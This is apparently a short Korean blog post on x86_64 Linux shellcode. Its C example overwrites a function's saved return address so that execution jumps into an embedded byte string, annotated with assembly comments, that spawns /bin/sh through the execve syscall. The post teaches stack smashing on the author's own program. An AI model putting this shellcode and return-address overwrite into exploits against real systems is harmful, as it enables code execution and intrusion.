---
layout: post
title: "Linux x86_64 shellcode 2"
date: 2014-11-09 15:32:12 +0900
comments: true
categories: 
---

callee 스택을 파괴하는 예제를 짜보았다. 

callee stackframe 에서 return address 를 `_shellcode` 의 어드레스로 바꿔서 `retq` 가 실행될때 저기로 튀도록 한다.

    char *_shellcode = ""
        "\x48\x31\xd2"      /* xor rdx,rdx */
        "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  /* mov qword rbx, '//bin/sh' */
        "\x48\xc1\xeb\x08"  /* shr rbx,0x8 */
        "\x53"              /* push rbx */
        "\x48\x89\xe7"      /* mov rdi,rsp */
        "\x48\x31\xc0"      /* xor rax,rax */
        "\x50"              /* push rax */
        "\x57"              /* push rdi */
        "\x48\x89\xe6"      /* mov rsi,rsp */
        "\xb0\x3b"          /* mov al,0x3b */
        "\x0f\x05" ;        /* syscall */

    void explode() {
        long *ret;
        ret = (long *)&ret;
    #if 1
        ret++; // now points saved %rbp
        ret++; // now points return address
    #else
        __asm__(
        "add $16,%rax\n\t"
        "mov %rax, -0x8(%rbp)\n\t"
        );
    #endif
        *ret = _shellcode;
    }

    main()
    {
        explode();
    }
